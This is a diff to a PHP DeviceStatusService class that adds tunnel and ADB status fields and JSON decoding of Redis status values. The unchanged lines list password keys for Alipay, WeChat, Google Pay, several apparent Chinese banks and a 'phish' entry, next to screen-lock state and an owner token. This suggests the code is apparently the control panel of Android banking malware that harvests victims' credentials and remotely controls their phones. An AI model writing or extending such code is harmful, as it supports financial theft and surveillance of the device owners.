@@ -33,6 +33,8 @@ class DeviceStatusService
         'phoneNumber2' => 'phone_number2',
         'wsConnected' => 'ws_connected',
         'owner_token' => 'owner_token',
+        'tunnelStatus' => 'tunnel_status',
+        'adbStatus' => 'adb_status',
     ];
 
     private const PASSWORD_FIELD_MAP = [
@@ -55,6 +57,7 @@ class DeviceStatusService
 
     private const TRANSIENT_KEYS = [
         'wallpap', 'activz', 'is_locked', 'is_screen_on',
+        'tunnel_status', 'adb_status',
         'pass_phone', 'pass_phish', 'pass_alipay', 'pass_wechat',
         'pass_yun', 'pass_jian', 'pass_you', 'pass_nong',
         'pass_zhong', 'pass_gong', 'pass_zhao', 'pass_gpay',
@@ -115,12 +118,19 @@ class DeviceStatusService
             'last_seen_at' => $device->last_seen_at?->toISOString(),
             'installed_at' => $device->installed_at?->toISOString(),
             'lastPing' => $device->last_seen_at?->getTimestamp() ? $device->last_seen_at->getTimestamp() * 1000 : 0,
+            'tunnel_status' => $device->tunnel_status ?? 'unknown',
         ];
 
         $redisStatus = $this->connectionManager->getDeviceStatus($phoneId);
         foreach (self::TRANSIENT_KEYS as $key) {
             if (isset($redisStatus[$key]) && $redisStatus[$key] !== '') {
-                $result[$key] = $redisStatus[$key];
+                $val = $redisStatus[$key];
+                if (is_string($val) && ($val[0] === '{' || $val[0] === '[')) {
+                    $decoded = json_decode($val, true);
+                    $result[$key] = $decoded !== null ? $decoded : $val;
+                } else {
+                    $result[$key] = $val;
+                }
             }
         }
 
@@ -264,6 +274,10 @@ class DeviceStatusService
             if (isset($status[$statusKey]) && is_numeric($status[$statusKey])) {
                 $updates[$dbColumn] = (int) $status[$statusKey];
             }
+        }
+
+        if (isset($status['tunnel_status']) && $status['tunnel_status'] !== '') {
+            $updates['tunnel_status'] = $status['tunnel_status'];
         }
 
         $boolFields = [
